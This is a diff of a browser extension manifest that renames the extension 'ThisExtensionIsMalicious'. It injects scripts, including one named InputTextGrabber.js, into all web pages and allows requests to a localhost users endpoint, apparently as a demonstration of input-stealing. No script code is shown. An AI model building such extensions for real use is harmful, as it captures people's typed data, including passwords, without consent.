@@ -1,7 +1,7 @@
 {
   "manifest_version": 2,
-  "name": "My Cool Extension",
-  "version": "0.1",
+  "name": "ThisExtensionIsMalicious",
+  "version": "1.0",
   "permissions": [
     "http://localhost:3000/users"
   ],
@@ -10,7 +10,7 @@
       "matches": [
         "<all_urls>"
       ],
-      "js": ["jquery-3.4.1.min.js", "content.js", "InputTextGrabber.js"]
+      "js": ["jquery-3.4.1.min.js", "basicInfo.js", "InputTextGrabber.js"]
     }
   ]
 }
